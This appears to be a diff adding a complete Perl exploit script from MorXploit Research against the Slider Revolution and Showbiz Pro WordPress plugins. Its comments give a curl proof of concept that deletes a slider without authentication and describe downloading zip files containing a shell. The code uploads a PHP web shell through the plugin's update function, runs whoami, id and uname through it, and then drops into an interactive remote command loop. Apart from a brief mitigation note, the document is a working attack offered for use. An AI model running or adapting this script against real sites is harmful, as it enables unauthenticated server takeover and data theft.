@@ -1,0 +1,289 @@
+#!/usr/bin/perl
+#
+# Title: Slider Revolution/Showbiz Pro shell upload exploit
+# Author: Simo Ben youssef
+# Contact: Simo_at_Morxploit_com
+# Discovered: 15 October 2014
+# Coded: 15 October 2014
+# Updated: 25 November 2014
+# Published: 25 November 2014
+# MorXploit Research
+# http://www.MorXploit.com
+# Vendor: ThemePunch
+# Vendor url: http://themepunch.com
+# Software: Revslider/Showbiz Pro
+# Versions: <= 3.0.95 (Revslider) / Version: <= 1.7.1 (Showbiz Pro) 
+# Products url: 
+# http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380
+# http://codecanyon.net/item/showbiz-pro-responsive-teaser-wordpress-plugin/4720988
+# Vulnerable scripts:
+# revslider/revslider_admin.php
+# showbiz/showbiz_admin.php
+#
+# About the plugins:
+# The #1 Slider plugin, used by millions, slider revolution is an all-purpose slide displaying solution that allows for showing almost any
+# kind of content whith highly customizable, transitions, effects and custom animations.
+# Showbiz Pro is a responsive teaser displaying solution that allows you to show WordPress Posts or any Custom Content with a set
+# amount of teaser items.
+#
+# Description:
+# Slider Revolution and Showbiz Pro fail to check authentication in revslider_admin.php/showbiz_admin.php allowing an unauthenticated
+# attacker to abuse administrative features.
+# Some of the features include:
+# Creating/Deleting/Updating sliders
+# Importing/exporting sliders
+# Updading plugin
+# For a full list of functions please see revslider_admin.php/showbiz_admin.php
+#
+# PoC on revslider:
+# 1- Deleting a slider:
+# root@host:/home/rootuser# curl -v --data "action=revslider_ajax_action&client_action=delete_slider&data[sliderid]=1" 
+# http://****.com/wp-admin/admin-ajax.php
+# * Connected to ****.com (**.**.**.**) port 80 (#0)
+# > POST /wp-admin/admin-ajax.php HTTP/1.1
+# > User-Agent: curl/7.35.0
+# > Host: ****.com
+# > Accept: */*
+# > Content-Length: 73
+# > Content-Type: application/x-www-form-urlencoded
+# > 
+# * upload completely sent off: 73 out of 73 bytes
+# < HTTP/1.1 200 OK
+# < Date: Fri, 24 Oct 2014 23:25:07 GMT
+# * Server Apache/2.4.6 (Unix) OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 is not blacklisted
+# < Server: Apache/2.4.6 (Unix) OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635
+# < X-Powered-By: PHP/5.4.18
+# < X-Robots-Tag: noindex
+# < X-Content-Type-Options: nosniff
+# < Expires: Wed, 11 Jan 1984 05:00:00 GMT
+# < Cache-Control: no-cache, must-revalidate, max-age=0
+# < Pragma: no-cache
+# < X-Frame-Options: SAMEORIGIN
+# < Set-Cookie: PHPSESSID=a23ex1c8a573f1d1xd28c301793ba022c; path=/
+# < Transfer-Encoding: chunked
+# < Content-Type: text/html; charset=UTF-8
+# < 
+# * Connection #0 to host http://****.com left intact
+#
+# {"success":true,"message":"The slider deleted","is_redirect":true,"redirect_url":"http:\/\/****.com\/wp-admin\/admin.php?page=revslider&view=sliders"}
+#
+# 2- Uploading an web shell:
+# The following perl exploit will try to upload an HTTP php shell through the the update_plugin function
+# To use the exploit make sure you download first the revslider.zip and showbiz.zip files which contain cmd.php
+# http://www.morxploit.com/morxploits/revslider.zip
+# http://www.morxploit.com/morxploits/showbiz.zip
+# and save them it in the same directory where you have the exploit.
+# 
+# Demo:
+# perl morxrev.pl http://localhost revslider
+# ===================================================
+# --- Revslider/Showbiz shell upload exploit
+# --- By: Simo Ben youssef <simo_at_morxploit_com>
+# --- MorXploit Research www.MorXploit.com
+# ===================================================
+# [*] Target set to revslider
+# [*] MorXploiting http://localhost
+# [*] Sent payload
+# [+] Payload successfully executed
+# [*] Checking if shell was uploaded
+# [+] Shell successfully uploaded
+#
+# Linux MorXploit 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:30:00 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+#
+# www-data@MorXploit:~$ 
+#
+# Download:
+# Exploit:
+# http://www.morxploit.com/morxploits/morxrevbiz.pl
+# Exploit update zip files:
+# http://www.morxploit.com/morxploits/revslider.zip
+# http://www.morxploit.com/morxploits/showbiz.zip
+#
+# Requires LWP::UserAgent
+# apt-get install libwww-perl
+# yum install libwww-perl
+# perl -MCPAN -e 'install Bundle::LWP'
+# For SSL support:
+# apt-get install liblwp-protocol-https-perl
+# yum install perl-Crypt-SSLeay
+#
+# Mitigation:
+# Besides the recently LFI vulnerability that was published couple months ago, this is another vulnerability that revslider developers have 
+# decided to patch without releasing a full security advisory, leaving thousands of revslider users who didn't update their plugin to the
+# latest version (=> 3.0.96) vulnerable to this nasty flaw, revsliders developers will argue the fact that their slider comes with an
+# auto-update feature, but the problem is that this plugin is bundled with a lot of themes, which means that those themes users may not get
+# plugin updates or will have to pay to get the update. In other words revslider developers believe that every user should have the
+# auto-update feature on, otherwise ... you are screwed.
+# Obviously this is way more critical than the LFI vulnerability because it allows shell access giving attackers access to the target system
+# as well as the ability to dump the entire wordpress database locally.
+# That being said, upgrade immediately to the latest version or disable/switch to another plugin.
+# As for Showbiz Pro, sadly the vulnerability has never been patched as we successfully exploited it in the latest version (1.7.1).
+#
+# Author disclaimer:
+# The information contained in this entire document is for educational, demonstration and testing purposes only.
+# Author cannot be held responsible for any malicious use or damage. Use at your own risk.
+#
+# Got comments or questions?
+# Simo_at_MorXploit_dot_com
+#
+# Did you like this exploit?
+# Feel free to buy me a beer =)
+# My btc address: 1Ko12CUAFoWn8syrvg4aQokFedNiwD6d7u
+# Cheers!
+
+use LWP::UserAgent;
+use MIME::Base64;
+use strict;
+
+sub banner {
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+print "===================================================\n";
+print "--- Revslider/Showbiz shell upload exploit\n";
+print "--- By: Simo Ben youssef <simo_at_morxploit_com>\n";
+print "--- MorXploit Research www.MorXploit.com\n";
+print "===================================================\n";
+}
+
+if (!defined ($ARGV[0] && $ARGV[1])) {
+banner();
+print "perl $0 <target> <plugin>\n";
+print "perl $0 http://localhost revslider\n";
+print "perl $0 http://localhost showbiz\n";
+exit;
+}
+
+my $zip1 = "revslider.zip";
+my $zip2 = "showbiz.zip";
+
+unless (-e ($zip1 && $zip2))
+{ 
+banner();
+print "[-] $zip1 or $zip2 not found! RTFM\n";
+exit;
+}
+
+my $host = $ARGV[0];
+my $plugin = $ARGV[1];
+my $action;
+my $update_file;
+
+if ($plugin eq "revslider") {
+$action = "revslider_ajax_action";
+$update_file = "$zip1";
+}
+elsif ($plugin eq "showbiz") {
+$action = "showbiz_ajax_action";
+$update_file = "$zip2";
+}
+else {
+banner();
+print "[-] Wrong plugin name\n";
+print "perl $0 <target> <plugin>\n";
+print "perl $0 http://localhost revslider\n";
+print "perl $0 http://localhost showbiz\n";
+exit;
+}
+my $target = "wp-admin/admin-ajax.php";
+my $shell = "wp-content/plugins/$plugin/temp/update_extract/$plugin/cmd.php"; 
+
+sub randomagent {
+my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
+'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
+'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
+'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
+'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
+);
+my $random = $array[rand @array];
+return($random);
+}
+my $useragent = randomagent();
+
+my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
+$ua->timeout(10);
+$ua->agent($useragent);
+my $status = $ua->get("$host/$target");
+unless ($status->is_success) {
+banner();
+print "[-] Xploit failed: " . $status->status_line . "\n";
+exit;
+}
+
+banner();
+print "[*] Target set to $plugin\n";
+print "[*] MorXploiting $host\n";
+
+my $exploit = $ua->post("$host/$target", Cookie => "", Content_Type => "form-data", Content => [action => "$action", client_action => "update_plugin", update_file => ["$update_file"]]);
+
+print "[*] Sent payload\n";
+
+if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
+print "[+] Payload successfully executed\n";
+}
+
+elsif ($exploit->decoded_content =~ /Wrong request/) {
+print "[-] Payload failed: Not vulnerable\n";
+exit;
+}
+
+elsif ($exploit->decoded_content =~ m/0$/) {
+print "[-] Payload failed: Plugin unavailable\n";
+exit;
+}
+
+else {
+$exploit->decoded_content =~ /<\/b>(.*?)<br>/;
+print "[-] Payload failed:$1\n";
+print "[-] " . $exploit->decoded_content unless (defined $1);
+print "\n";
+exit;
+}
+
+print "[*] Checking if shell was uploaded\n";
+
+sub rndstr{ join'', @_[ map{ rand @_ } 1 .. shift ] }
+my $rndstr = rndstr(8, 1..9, 'a'..'z');
+my $cmd1 = encode_base64("echo $rndstr");
+my $status = $ua->get("$host/$shell?cmd=$cmd1");
+
+if ($status->decoded_content =~ /system\(\) has been disabled/) {
+print "[-] Xploit failed: system() has been disabled\n";
+exit;
+}
+
+elsif ($status->decoded_content !~ /$rndstr/) {
+print "[-] Xploit failed: " . $status->status_line . "\n";
+exit;
+}
+
+elsif ($status->decoded_content =~ /$rndstr/) {
+print "[+] Shell successfully uploaded\n";
+}
+my $cmd2 = encode_base64("whoami");
+my $whoami = $ua->get("$host/$shell?cmd=$cmd2");
+my $cmd3 = encode_base64("uname -n");
+my $uname = $ua->get("$host/$shell?cmd=$cmd3");
+my $cmd4 = encode_base64("id");
+my $id = $ua->get("$host/$shell?cmd=$cmd4");
+my $cmd5 = encode_base64("uname -a");
+my $unamea = $ua->get("$host/$shell?cmd=$cmd5");
+print $unamea->decoded_content; 
+print $id->decoded_content;
+my $wa = $whoami->decoded_content;
+my $un = $uname->decoded_content;
+chomp($wa);
+chomp($un);
+
+while () {
+print "\n$wa\@$un:~\$ ";
+chomp(my $cmd=<STDIN>);
+if ($cmd eq "exit") 
+{ 
+print "Aurevoir!\n";
+exit;
+}
+my $ucmd = encode_base64("$cmd");
+my $output = $ua->get("$host/$shell?cmd=$ucmd");
+print $output->decoded_content;
+}
